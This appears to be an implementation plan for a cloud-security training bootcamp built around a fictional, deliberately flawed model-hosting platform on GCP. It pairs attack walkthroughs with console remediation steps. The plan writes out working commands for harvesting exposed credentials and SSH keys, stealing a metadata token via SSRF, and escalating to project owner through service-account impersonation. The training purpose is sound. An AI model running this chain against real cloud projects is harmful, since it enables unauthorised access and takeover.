# AI Security Bootcamp Implementation Plan

Context: "CloudAI Labs" - A model hosting platform (like Hugging Face) with security flaws

## Implementation Details

### Code Structure
- Use terraform files for deployment
- Add simple Flask ML API

### Student Experience
- ~30 minutes per module
- Story → Attack → Fix
- Visual diagrams provided

### Simplifications
- Pre-configured gcloud
- Focus: Storage, Functions, IAM

# Modules

## Module 1: Enumeration and Discovery
**Attack**:
- Predictable bucket names: modeldata-{dev,prod}
  - Student given 'modeldata-dev' bucket to start
- Dev bucket has a 'bucket-service-account'.json
- The 'bucket-service-account' has access to 'modeldata-prod' bucket
- Hints:
  - Hint1: "what's in the bucket? any creds?"
  - Hint2: "what can those creds access? (insert use-creds-command here)
  - Hint3: "what if there was another bucket for prod?"

**Remediation**:
- Go to Cloud Storage → Select "cloudai-dev" bucket
  - Delete the service account json from the bucket
- Go to IAM, Create new Service Account 'dev-bucket-sa'
  - Student selects tf-preconfigured 'Dev Bucket Access' role

**Engagement**: "CloudAI's 'secret' GPT-6 benchmarks leaked. No insider needed - how?"


## Module 2: Environment Secrets & State Exposure
**Attack** (Adapt Module 2):
- `gsutil ls` newly discovered 'modeldata-prod' bucket
  - Discover + download Terraform Statefile
- Examine file, notice 'alice' user, and 'nat' IP
  - Also notice "SSH key" secret visible in encoded form
- Decode SSH Key, dump to local file
  - Use it to `ssh alice@nat-ip` to access deployed VM

**Remediation**:
Prevent decodable SSH Key
- Open GCP Console → Security → Secret Manager
- Click "Create Secret", name: "ssh-key"
- Paste the exposed SSH key, click "Create"

**Engagement**: "Your startup's LLM architecture leaked. Trace the breach through exposed deployment files."

## Module 3: Instance Metadata Service Exploitation  
**Attack** (Use Module 3):
- SSH into VM from Module 2: `ssh -i ~/.ssh/alice-key alice@<NAT-IP>`
- Check current service account: `gcloud auth list`
  - Notice default compute service account with full project access
- Discover cloud function bucket: `gsutil ls`
  - Find 'cloud-function-bucket-module3' in output
- Read function source: `gsutil cat gs://cloud-function-bucket-module3/main.py`
  - Notice SSRF vulnerability in monitoring endpoint
- Run pre-installed script: `./invoke_monitoring_function.sh`
  - Script shows function URL format
- Extract service account token via SSRF:
  ```
  curl -X POST https://$LOCATION-$PROJECT_ID.cloudfunctions.net/monitoring-function \
    -H "Authorization: bearer $(gcloud auth print-identity-token)" \
    -H "Content-Type: application/json" \
    -d '{"metadata": "token"}'
  ```
- Hints:
  - Hint1: "Check what service account the VM is using"
  - Hint2: "Look for cloud functions in storage buckets"
  - Hint3: "The monitoring function fetches URLs - what about metadata.google.internal?"

**Remediation**:
- Go to IAM & Admin → Service Accounts → Create
- Name: "model-api-vm", description: "Minimal VM account"
- Skip permissions for now → Create
- Compute Engine → VM instances → Click instance
- Edit → Service account → Select "model-api-vm"
- Save → Test: SSRF gets limited token

**Engagement**: "Inference costs exploded overnight. The model API is accessing internal resources."

## Module 4: Service Account Misconfigurations [Extension]
**Attack** (Use Challenge 5):
- Use token from Module 3: `export CLOUDSDK_AUTH_ACCESS_TOKEN=<function-token>`
- Check project permissions: `gcloud projects get-iam-policy $PROJECT_ID`
  - Notice monitoring-function@ has custom role
- List all service accounts: `gcloud iam service-accounts list`
  - Find terraform-pipeline@ with admin privileges
- Examine custom role: `gcloud iam roles describe TerraformPipelineProjectAdmin --project $PROJECT_ID`
  - Has owner-like permissions including setIamPolicy
- Check terraform SA bindings: `gcloud iam service-accounts get-iam-policy terraform-pipeline@$PROJECT_ID.iam.gserviceaccount.com`
  - monitoring-function@ has Token Creator role!
- Impersonate to escalate privileges:
  ```
  gcloud projects add-iam-policy-binding $PROJECT_ID \
    --member=user:<your-email> --role=roles/owner \
    --impersonate-service-account terraform-pipeline@$PROJECT_ID.iam.gserviceaccount.com
  ```
- Verify escalation: `gcloud projects get-iam-policy $PROJECT_ID | grep -A2 <your-email>`
- Hints:
  - Hint1: "What other service accounts exist in the project?"
  - Hint2: "Check IAM bindings on the terraform service account"
  - Hint3: "Service Account Token Creator allows impersonation"

**Remediation**:
- Navigate to IAM & Admin → Service Accounts
- Find "monitoring-function@" account → Click name
- Go to "Permissions" tab → View all permissions
- Find "terraform-pipeline@" in the list
- Click pencil icon next to "Service Account Token Creator"
- Select "Remove" → Confirm removal
- Test: `gcloud iam service-accounts get-iam-policy terraform-pipeline@...`
  - Verify monitoring-function@ no longer listed

**Engagement**: "Ex-employee claims they deleted all models using just an API token. Investigate."

